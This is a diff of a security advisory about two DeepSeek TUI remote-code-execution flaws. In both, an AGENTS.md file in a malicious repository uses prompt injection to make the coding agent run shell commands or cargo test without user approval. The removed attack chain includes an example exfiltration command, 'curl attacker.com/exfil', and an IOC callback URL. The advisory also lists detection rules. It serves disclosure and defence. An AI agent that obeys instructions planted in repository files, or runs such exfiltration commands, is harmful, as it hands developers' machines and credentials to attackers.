@@ -1,8 +1,8 @@
 ---
-title: DeepSeek TUI RCE via Prompt Injection in Project Files
+title: DeepSeek TUI run_tests Tool Enables RCE via Malicious Repository Without Approval
 slug: 2026-05-deepseek-tui-rce
-description: DeepSeek TUI versions before 0.8.26 are vulnerable to remote code execution via prompt injection due to insecure defaults in the `task_create` tool, spawning sub-agents that inherit `allow_shell` and `auto_approve` defaulting to true, which allows an attacker to inject malicious commands into project files that are then executed by the sub-agent without further approval from the user.
-date: "2026-05-14T20:36:06Z"
+description: DeepSeek TUI's `run_tests` tool allows for remote code execution (RCE) via a malicious repository without user approval due to auto-approval of `cargo test` execution, which can be triggered by prompt injection via the `AGENTS.md` file, affecting versions >= 0.3.0 and < 0.8.23.
+date: "2026-05-14T20:36:21Z"
 type: advisory
 types:
   - advisory
@@ -11,71 +11,71 @@ severities:
 tags:
   - rce
   - prompt-injection
-  - deepseek-tui
-  - cve-2026-45374
+  - rust
+  - supply-chain
 vendors:
   - rust
+  - npm
 products:
-  - deepseek-tui (< 0.8.26)
+  - deepseek-tui (>= 0.3.0, < 0.8.23)
+  - deepseek-tui-cli (>= 0.3.0, < 0.8.23)
 mitre_ttps:
   - tactic_id: TA0002
     tactic_name: Execution
-    technique_id: T1203
-    technique_name: Exploitation for Client Execution
+    technique_id: T1059.004
+    technique_name: Command and Scripting Interpreter
+  - tactic_id: TA0001
+    tactic_name: Initial Access
+    technique_id: T1190
+    technique_name: Exploit Public-Facing Application
 references:
-  - https://github.com/advisories/GHSA-72w5-pf8h-xfp4
-  - CVE-2026-45374
-iocs:
-  - type: url
-    value: http://[collaborator]/badge-gen?project=web-service
-ioc_counts:
-  url: 1
+  - https://github.com/advisories/GHSA-wx44-2q6h-j6p8
+  - CVE-2026-45311
 rules:
-  - title: Detect Suspicious AGENTS.md modifications
-    description: Detects modification to AGENTS.md files containing suspicious shell command patterns.
+  - title: Detects CVE-2026-45311 Exploitation — Cargo Test Executing Shell Commands
+    description: Detects CVE-2026-45311 exploitation — `cargo test` executing shell commands, indicating potential malicious test code execution.
     platform: sigma
-    severity: medium
+    severity: critical
     tactics:
-      - initial_access
+      - execution
     techniques:
-      - T1203
+      - T1059.004
     data_sources:
-      - file_event
+      - process_creation
       - linux
-  - title: Detect Outbound Connections to Unusual Badge Generation URLs
-    description: Detects network connections to URLs matching the badge generation pattern used in the exploit.
+  - title: Detects AGENTS.md Prompt Injection Leading to cargo test Execution
+    description: Detects the presence of AGENTS.md file containing prompt injection attempting to force execution of cargo test.
     platform: sigma
     severity: high
     tactics:
-      - command_and_control
+      - initial_access
     techniques:
-      - T1071.001
+      - T1190
     data_sources:
-      - network_connection
+      - file_event
       - linux
 rules_count: 2
 ---
 
-DeepSeek TUI versions before 0.8.26 are susceptible to a remote code execution (RCE) vulnerability stemming from insecure default settings within the `task_create` tool. The vulnerability, identified as CVE-2026-45374, arises because the `task_create` tool spawns durable sub-agents with `allow_shell` and `auto_approve` both defaulting to `true`. This allows an attacker to inject malicious commands into project files, disguised as seemingly benign project conventions, which are then executed by the sub-agent without any further approval from the user. A developer cloning a malicious repository and opening it in DeepSeek-TUI is enough to trigger the vulnerability.
+DeepSeek TUI is vulnerable to remote code execution (RCE) due to the `run_tests` tool's automatic approval of `cargo test` execution. The `run_tests` tool executes `cargo test` in the workspace with `ApprovalRequirement::Auto`, meaning it runs without any user approval prompt. The `cargo test` command compiles and executes arbitrary code, including test binaries, build scripts, and proc macros. A malicious repository can leverage this to execute arbitrary shell commands, exfiltrate credentials, or establish persistence without any user interaction. This vulnerability is amplified by the `AGENTS.md` file, which is auto-loaded into the system prompt and can instruct the model to proactively run tests at session start. This vulnerability affects versions >= 0.3.0 and < 0.8.23 of the deepseek-tui, deepseek-tui-cli, and npm/deepseek-tui packages.
 
 ## Attack Chain
 
-1. An attacker creates a malicious repository containing a `src/lib.rs` file with legitimate code and an `AGENTS.md` file containing prompt injection disguised as project workflow.
-2. A developer clones the malicious repository and opens it in DeepSeek-TUI.
-3. The developer initiates a task using `task_create` with a prompt such as "fix the TODOs in src/lib.rs and write a README.md".
-4. The user approves the task creation, unaware of the implicit shell access granted to the sub-agent.
-5. A sub-agent spawns with `allow_shell=true` and `auto_approve=true` due to the insecure defaults.
-6. The sub-agent reads the `AGENTS.md` file from its system prompt, which contains attacker-controlled instructions disguised as project conventions.
-7. The sub-agent follows the injected instructions and executes shell commands, such as `curl attacker.com/exfil`, without further approval prompts.
-8. The attacker receives a callback, confirming remote code execution.
+1.  An attacker creates a malicious Rust repository.
+2.  The repository includes a `Cargo.toml` file, source code (`src/lib.rs`), and a malicious test file (`tests/integration_test.rs`) containing code to execute arbitrary commands, such as exfiltrating data using `curl`.
+3.  The repository also contains an `AGENTS.md` file with prompt injection instructions to direct the model to run tests automatically.
+4.  A user opens the malicious repository in DeepSeek TUI using the `deepseek-tui` command.
+5.  The `AGENTS.md` file is automatically loaded into the model's system prompt, instructing the model to run tests.
+6.  The model calls the `run_tests` tool, which is auto-approved due to `ApprovalRequirement::Auto`.
+7.  `cargo test` compiles and executes the malicious test code in `tests/integration_test.rs`.
+8.  The attacker receives a callback on their collaborator server, confirming remote code execution.
 
 ## Impact
 
-Successful exploitation of this vulnerability allows an attacker to execute arbitrary commands on the developer's machine. The vulnerability stems from the user approving task creation but implicitly granting unrestricted shell access to a sub-agent that executes attacker-controlled instructions. This crosses the approval security boundary, potentially leading to sensitive data exfiltration, system compromise, or further lateral movement within the network.
+Successful exploitation of this vulnerability allows an attacker to achieve remote code execution on the user's machine. A malicious file in the repository (such as `AGENTS.md`) is auto-loaded into the model's system prompt on session start. This content can contain prompt injection instructions that direct the model to call `run_tests`. Since `run_tests` is auto-approved, the full chain from opening the repo to arbitrary code execution requires zero user approval.
 
 ## Recommendation
 
-*   Upgrade to DeepSeek TUI version 0.8.26 or later to patch CVE-2026-45374.
-*   As a workaround, manually review and sanitize any `AGENTS.md` files in repositories before opening them in DeepSeek TUI.
-*   Implement network monitoring to detect outbound connections to suspicious URLs like `http://[collaborator]/badge-gen?project=web-service` as listed in the IOC table.
-*   Deploy the Sigma rules in this brief to your SIEM and tune for your environment to detect malicious command execution and suspicious file modifications.
+*   Upgrade to a version of DeepSeek TUI >= 0.8.23 to patch CVE-2026-45311.
+*   Implement the suggested mitigation of changing `run_tests` to require approval to prevent automatic execution of potentially malicious code.
+*   Monitor process creation events for `cargo test` executing shell commands, using a rule such as the one provided below to detect potential exploitation of CVE-2026-45311.
